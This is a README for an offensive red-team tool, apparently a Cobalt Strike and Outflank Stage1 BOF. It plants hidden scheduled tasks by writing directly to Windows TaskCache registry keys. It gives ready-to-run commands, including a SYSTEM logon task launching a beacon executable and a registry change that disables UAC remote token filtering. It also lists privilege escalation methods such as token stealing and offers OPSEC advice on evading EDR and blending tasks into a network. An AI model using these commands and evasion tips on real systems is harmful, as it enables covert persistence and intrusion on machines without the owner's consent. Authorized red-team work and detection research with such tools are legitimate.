# Ghost Task BOF

**Ghost Task** is a Beacon Object File (BOF) that creates and deletes scheduled tasks by directly manipulating Windows registry keys, bypassing the standard Task Scheduler COM APIs. This technique is useful for operational security as it can avoid certain detection mechanisms.

## Features

- **Registry-based manipulation**: Creates scheduled tasks without using Task Scheduler APIs
- **Multiple schedule types**: Supports secondly, daily, weekly, and logon-based triggers
- **Remote execution**: Can target remote systems (with appropriate permissions)
- **Dual-architecture support**: Compiled for both x86 and x64 architectures
- **OST-compatible**: Includes Python loader for Outflank Stage1 (OC2) integration

## Requirements

### Compilation
- `mingw-w64` cross-compiler for Windows targets
  - Ubuntu/Debian: `sudo apt install mingw-w64`
  - Kali Linux: `sudo apt install mingw-w64`
  - MacOS: `brew install mingw-w64`

### Runtime (Target System)
- **Privileges**: SYSTEM privileges required for local operations (see "SYSTEM Privilege Requirement" section)
- **Service restart**: Task Scheduler service must be restarted for changes to take effect
- **OS**: Windows 10/11 or Windows Server 2016+
- **Remote Registry service**: Must be running for remote operations
- **Network ports**: TCP 445, 135, and dynamic RPC ports (49152-65535) must be accessible for remote operations

## Building

```bash
# Build both x86 and x64 versions
make

# Build specific architecture
make x64
make x86

# Clean build artifacts
make clean
```

## Usage

### With OC2 (Outflank Stage1)

1. Copy files to OC2:
   ```bash
   cp ghost_task_bof.s1.py ghost_task.x64.o ghost_task.x86.o /path/to/stage1c2server/shared/bofs/
   ```

2. Restart OC2 server:
   ```bash
   python3 manage.py restart
   ```

   **Note**: The filename must be `ghost_task_bof.s1.py` (with a dot before `s1`) to be recognized by OC2.

3. Use in OC2:
   ```
   # Create a daily task
   ghost_task localhost add MyTask C:\Windows\System32\calc.exe "" SYSTEM daily 14:30

   # Create a weekly task (runs Monday and Friday at 2:00 AM)
   ghost_task localhost add BackupTask C:\backup.bat "" Administrator weekly 02:00 monday,friday

   # Create a logon task
   ghost_task localhost add BeaconTask C:\beacon.exe "" SYSTEM logon

   # Create a task that runs every 60 seconds
   ghost_task localhost add FrequentTask C:\script.exe "" SYSTEM second 60

   # Delete a task
   ghost_task localhost delete MyTask

   # Target a remote system
   ghost_task remote-host add RemoteTask C:\task.exe "" SYSTEM daily 12:00
   ```

### With Cobalt Strike

1. Load the BOF in a Beacon:
   ```
   inline-execute /path/to/ghost_task.x64.o localhost add MyTask C:\calc.exe "" SYSTEM daily 14:30
   ```

2. Use beacon_inline_execute for programmatic loading

## Command Syntax

```
ghost_task <computername> <operation> <taskname> [program] [argument] [username] [scheduletype] [time] [days]
```

### Parameters

- **computername**: Target computer name (use `localhost` for local system)
- **operation**: `add` or `delete`
- **taskname**: Name of the scheduled task
- **program**: Program path to execute (required for `add`)
- **argument**: Program arguments (use `""` if none, required for `add`)
- **username**: User account to run task under (required for `add`)
- **scheduletype**: `second`, `daily`, `weekly`, or `logon` (required for `add`)
- **time**: Execution time format depends on schedule type:
  - For `second`: Number of seconds (e.g., `60`)
  - For `daily`/`weekly`: Time in HH:MM format (e.g., `14:30`)
  - Not required for `logon`
- **days**: Comma-separated days for weekly schedule (e.g., `monday,friday`)

## Important Notes

### Service Restart Required

After adding or deleting tasks, the Schedule service must be restarted for changes to take effect:

```
sc_stop schedule
sc_start schedule
```

Or remotely:
```
sc_stop --hostname schedule 
sc_start --hostname schedule
```

### SYSTEM Privilege Requirement

**For local operations (`localhost`)**: The BOF **must** be run with SYSTEM privileges because the Task Scheduler registry keys (`TaskCache`) have restrictive ACLs that only allow SYSTEM-level access. Even Administrator accounts will receive `ERROR_ACCESS_DENIED` when attempting to modify these keys locally.

Elevation methods:
- `getsystem` in OC2/Cobalt Strike
- Named pipe impersonation
- Service creation/modification
- Token stealing/manipulation

**Why SYSTEM is required**: The registry keys at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\` are protected by Windows with special permissions that restrict write access to the SYSTEM account only, even for members of the Administrators group.

### Remote Operations

Remote operations have different requirements and limitations:

**Network Requirements:**
- **TCP 445** (SMB) - Primary communication port
- **TCP 135** (RPC Endpoint Mapper)
- **TCP 49152-65535** (Dynamic RPC ports for registry operations)
- Remote Registry service must be running on target

**Permission Requirements:**
- Administrative credentials (local admin)
- May require **UAC remote restrictions** to be disabled on target
- Registry write permissions (can be blocked by UAC token filtering)

**Common Issues:**
1. **Error 53** (`ERROR_BAD_NETPATH`) - Network path not found, check hostname resolution and network connectivity
2. **Error 5** (`ERROR_ACCESS_DENIED`) - Usually caused by:
   - UAC Remote Restrictions (most common)
   - Insufficient privileges
   - Registry ACL restrictions

**Fixing UAC Remote Restrictions:**
On the target system, disable UAC remote token filtering:
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

**Best Practice for Remote:**
- Use domain administrator credentials when possible (not subject to UAC filtering)
- Ensure Remote Registry service is running: `sc \\target query RemoteRegistry`
- Test basic SMB connectivity first: `dir \\target\c$`
- Consider deploying an implant to the target as SYSTEM and using `localhost` instead

## Schedule Types

### 1. Second (Interval-based)
Executes the task repeatedly at a specified interval in seconds.
```
ghost_task localhost add IntervalTask C:\task.exe "" SYSTEM second 300
```

### 2. Daily
Executes the task once per day at a specified time.
```
ghost_task localhost add DailyTask C:\task.exe "" SYSTEM daily 09:30
```

### 3. Weekly
Executes the task on specific days of the week at a specified time.
```
ghost_task localhost add WeeklyTask C:\task.exe "" Administrator weekly 18:00 monday,wednesday,friday
```

### 4. Logon
Executes the task when the specified user logs on.
```
ghost_task localhost add LogonTask C:\task.exe "" SYSTEM logon
```

## Technical Details

Ghost Task directly manipulates these registry keys:
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\`
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\`

This approach:
- Bypasses Task Scheduler COM APIs
- Creates properly formatted binary structures in registry
- Requires Task Scheduler service restart to load new tasks
- May evade detection mechanisms looking for API calls

## Operational Security Considerations

**Detection Vectors:**
- Registry modifications to TaskCache keys (Sysmon Event ID 13)
- Task Scheduler service restart events
- New scheduled task creation (Event ID 106) - triggered after service restart
- SYSTEM privilege requirement (privilege escalation activity)
- Remote registry access (Event ID 4656/4663 for object access)
- Network traffic on SMB/RPC ports for remote operations

**Advantages over Standard Methods:**
- Bypasses Task Scheduler COM API monitoring
- Direct registry manipulation can evade some EDR/behavioral detection
- No `schtasks.exe` or PowerShell cmdlet execution
- Task doesn't appear in Task Scheduler until service restart

**OPSEC Recommendations:**
- Use legitimate-looking task names and paths that blend with environment
- Schedule tasks during maintenance windows or business hours
- Clean up tasks after objective completion
- Restart Task Scheduler service during normal system maintenance to reduce suspicion
- For remote operations, consider using existing admin shares/SMB sessions to avoid new network indicators
- Monitor for registry-based detection rules in target environment

## Credits

- Original implementation: TrustedSec CS-Remote-OPs-BOF
- OST adaptation: Based on ClipboardHistoryThief-BOF structure
- Registry manipulation technique: Based on research from cyber.wtf

## License

This tool is provided for authorized security testing and research purposes only. Users are responsible for ensuring they have proper authorization before using this tool.

## References

- [TrustedSec CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)
- [Windows Registry Analysis - Tasks](https://cyber.wtf/2022/06/01/windows-registry-analysis-todays-episode-tasks/)
- [Outflank Stage1](https://github.com/outflanknl/stage1)
